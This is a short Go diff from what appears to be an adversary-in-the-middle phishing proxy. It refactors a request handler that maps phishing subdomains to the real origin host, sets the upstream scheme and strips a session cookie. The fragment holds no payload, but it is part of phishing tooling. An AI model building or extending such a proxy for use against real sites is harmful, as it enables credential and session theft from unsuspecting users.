@@ -2,7 +2,6 @@ package request
 
 import (
 	"net/http"
-	"strings"
 
 	"github.com/travisbale/mirage/internal/aitm"
 	"github.com/travisbale/mirage/internal/proxy"
@@ -18,24 +17,14 @@ func (h *URLRewriter) Handle(ctx *aitm.ProxyContext, req *http.Request) error {
 	if ctx.Phishlet == nil {
 		return nil
 	}
-	origHost := resolveOrigHost(ctx.Phishlet, req.Host)
-	if origHost != "" {
-		req.Host = origHost
-		req.URL.Host = origHost
+	if ph := ctx.Phishlet.FindProxyHost(req.Host); ph != nil {
+		origin := ph.OriginHost()
+		req.Host = origin
+		req.URL.Host = origin
+		req.URL.Scheme = ph.UpstreamScheme
 	}
 	stripCookie(req, sessionCookieName)
 	return nil
-}
-
-func resolveOrigHost(p *aitm.Phishlet, phishHost string) string {
-	lowerPhishHost := strings.ToLower(hostWithoutPort(phishHost))
-	for i := range p.ProxyHosts {
-		phishFQDN := strings.ToLower(p.ProxyHosts[i].PhishSubdomain + "." + p.BaseDomain)
-		if lowerPhishHost == phishFQDN {
-			return p.ProxyHosts[i].OriginHost()
-		}
-	}
-	return ""
 }
 
 func stripCookie(req *http.Request, name string) {
